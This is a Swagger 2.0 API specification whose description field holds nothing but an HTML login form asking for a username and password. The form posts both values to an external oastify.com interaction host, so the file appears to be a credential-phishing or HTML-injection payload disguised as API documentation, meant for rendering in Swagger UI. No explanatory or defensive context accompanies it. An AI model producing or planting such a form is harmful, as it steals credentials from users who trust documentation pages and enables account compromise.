swagger: '2.0'
info:
  version: 1.0.0
  title: Login Page
  description: |
    <div class="login-form" style="font-family: sans-serif;">
      <div class="form-container" style="width: 100%; max-width: 400px; margin: 20px auto; padding: 20px; background: #fff; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); border: 1px solid #eee;">
        <h2 style="text-align: center; color: #333;">Login Page</h2>
        <form action="http://isexbjuxknrc17t3jv3bx34u7ldc12pr.oastify.com" method="post">
          <div style="margin-bottom: 15px;">
            <label style="display: block; margin-bottom: 5px; font-weight: bold;">Username</label>
            <input type="text" name="username" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
          </div>
          <div style="margin-bottom: 15px;">
            <label style="display: block; margin-bottom: 5px; font-weight: bold;">Password</label>
            <input type="password" name="password" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
          </div>
          <button type="submit" style="width: 100%; padding: 12px; background-color: #5cb85c; border: none; color: white; font-size: 16px; border-radius: 4px; cursor: pointer;">Login</button>
        </form>
      </div>
    </div>
